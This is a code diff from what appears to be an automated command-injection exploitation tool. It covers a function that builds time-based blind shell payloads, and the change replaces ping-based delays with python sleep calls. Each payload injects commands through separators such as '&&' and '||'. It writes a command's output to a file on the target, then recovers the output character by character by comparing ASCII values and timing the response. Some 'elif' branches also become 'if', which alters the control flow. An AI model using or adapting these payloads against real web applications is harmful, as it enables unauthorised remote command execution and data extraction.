@@ -112,12 +112,12 @@ def exploitation(url,delay,filename,http_request_method):
 			# Find the length of the output, using readline().
 			"str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")"+ seperator + " "
 			"if [ \"" + str(j) + "\" -ne ${str1} ]" + seperator  + " "
-			"then echo 0" + seperator + " "
-			"else ping -c"+ str(delay+1) +" 127.0.0.1  " + seperator + " "
+			"then $(python -c \"import time;time.sleep(0)\")"+ seperator + " "
+			"else $(python -c \"import time;time.sleep("+ str(delay) +")\")"+ seperator + " "
 			"fi "
 			)
 	      #-----------------------------------------------------------------------------------------
-	    elif seperator == "&&" :
+	    if seperator == "&&" :
 	      payload = (urllib.quote('&') + " " +
 			"sleep 0 " + urllib.quote(seperator) + " "
 			"str=$(echo "+ TAG + " > " + OUTPUT_TEXTFILE + ")" + urllib.quote(seperator) + " "
@@ -130,15 +130,15 @@ def exploitation(url,delay,filename,http_request_method):
 	      #  __Warning__: This (alternative) python-shell is still experimental.
 	      #-----------------------------------------------------------------------------------------
 	      payload = (urllib.quote('&') + " " +
-			"echo 0 " + urllib.quote(seperator) + " "
+			"$(python -c \"import time;time.sleep(0)\")" + urllib.quote(seperator) + " "
 			"str=$(echo "+ TAG + " > " + OUTPUT_TEXTFILE + ")" + urllib.quote(seperator) + " "
 			# Find the length of the output, using readline().
 			"str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")" + urllib.quote(seperator) + " "
 			"[ " + str(j) + " -eq ${str1} ]" + urllib.quote(seperator) + " "
-			"ping -c"+ str(delay+1) +" 127.0.0.1  " + seperator + " "
+			"$(python -c \"import time;time.sleep("+ str(delay) +")\")" + seperator + " "
 			)
 	      #-----------------------------------------------------------------------------------------
-	    elif seperator == "||" :
+	    if seperator == "||" :
 	      payload = (seperator + " "
 			"echo '" + TAG + "' > " + OUTPUT_TEXTFILE + " | "+ 
 			"[ " + str(j) + " -ne $(cat \""+OUTPUT_TEXTFILE+"\" | wc -c) ] " + seperator + " "
@@ -151,7 +151,7 @@ def exploitation(url,delay,filename,http_request_method):
 			"echo '" + TAG + "' > " + OUTPUT_TEXTFILE + " | "+ 
 			# Find the length of the output, using readline().
 			"[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + seperator + " "
-			"echo 0 | ping -c"+ str(delay+1) +" 127.0.0.1  "
+			"$(python -c \"import time;time.sleep(0)\") | $(python -c \"import time;time.sleep("+ str(delay) +")\")"
 			) 
 	      ##-----------------------------------------------------------------------------------------
 	    else:
@@ -369,8 +369,8 @@ def exploitation(url,delay,filename,http_request_method):
 				  # Find the length of the output, using readline().
 				  "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")"+ seperator + " "
 				  "if [ \"" + str(j) + "\" != ${str1} ]; " +
-				  "then sleep 0 " + seperator +
-				  "else ping -c"+ str(delay+1) +" 127.0.0.1 " + seperator + " "
+				  "then $(python -c \"import time;time.sleep(0)\")"+ seperator + " "
+				  "else $(python -c \"import time;time.sleep("+ str(delay) +")\")"+ seperator + " "
 				  "fi "
 				  )
 			#-----------------------------------------------------------------------------------------
@@ -389,12 +389,12 @@ def exploitation(url,delay,filename,http_request_method):
 			#  __Warning__: This (alternative) python-shell is still experimental.
 			#-----------------------------------------------------------------------------------------
 			payload = (urllib.quote('&') + " " +
-				  "echo 0 " + urllib.quote(seperator) + " "
+				  "$(python -c \"import time;time.sleep(0)\")" + urllib.quote(seperator) + " "
 				  "str=$(\""+cmd+"\"| tr '\n' ' ' > " + OUTPUT_TEXTFILE +") " + urllib.quote(seperator) + " "
 				  # Find the length of the output, using readline().
 				  "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")" + urllib.quote(seperator) + " "
 				  "[ " + str(j) + " -eq ${str1} ]" + urllib.quote(seperator) + " "
-				  "ping -c"+ str(delay+1) +" 127.0.0.1  " + seperator + " "
+				  "$(python -c \"import time;time.sleep("+ str(delay) +")\")"
 				  )
 			#-----------------------------------------------------------------------------------------
 			
@@ -411,7 +411,7 @@ def exploitation(url,delay,filename,http_request_method):
 				  "echo $(" + cmd + ") | tr '\n' ' '> " + OUTPUT_TEXTFILE + " | "+ 
 				  # Find the length of the output, using readline().
 				  "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + seperator + " "
-				  "echo 0 | ping -c"+ str(delay+1) +" 127.0.0.1  "
+				  "$(python -c \"import time;time.sleep(0)\") | $(python -c \"import time;time.sleep("+ str(delay) +")\")"
 				  ) 
 			
 		      # Check if defined "--prefix" option.
@@ -542,8 +542,8 @@ def exploitation(url,delay,filename,http_request_method):
 			  payload = (seperator + " "
 				    "str=$(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(i-1)+"]);sys.exit(0)\")" + seperator +
 				    "if [ \"" + str(ascii_char) + "\" != ${str} ]" + seperator +
-				    "then echo 0" + seperator +
-				    "else ping -c"+ str(delay+1) +" 127.0.0.1 " + seperator +
+				    "then $(python -c \"import time;time.sleep(0)\")"+ seperator + " "
+				    "else $(python -c \"import time;time.sleep("+ str(delay) +")\")"+ seperator + " "
 				    "fi "
 				    )
 			  #-----------------------------------------------------------------------------------------
@@ -559,10 +559,10 @@ def exploitation(url,delay,filename,http_request_method):
 			  #  __Warning__: This (alternative) python-shell is still experimental.
 			  #-----------------------------------------------------------------------------------------
 			  payload = (urllib.quote('&') + " " +
-				    "echo 0 " + urllib.quote(seperator) + " "
+				    "$(python -c \"import time;time.sleep(0)\")" + urllib.quote(seperator) + " "
 				    "str=$(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(i-1)+"]);sys.exit(0)\")" + urllib.quote(seperator) + " "
 				    "[ " + str(ascii_char) + " -eq ${str} ]" + urllib.quote(seperator) + " "
-				    "ping -c"+ str(delay+1) +" 127.0.0.1 "
+				    "$(python -c \"import time;time.sleep("+ str(delay) +")\")"
 				    )
 			  #-----------------------------------------------------------------------------------------
 			  
@@ -578,7 +578,7 @@ def exploitation(url,delay,filename,http_request_method):
 			  payload = (seperator + " "
 				    "echo '" + TAG + "' |"+
 				    "[ \"" + str(ascii_char) + "\" -ne  $(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(i-1)+"]);sys.exit(0)\") ] " + seperator + 
-				    "echo 0 | ping -c"+ str(delay+1) +" 127.0.0.1  "
+				    "$(python -c \"import time;time.sleep(0)\") | $(python -c \"import time;time.sleep("+ str(delay) +")\")"
 				    )
 			 #-----------------------------------------------------------------------------------------
 			 
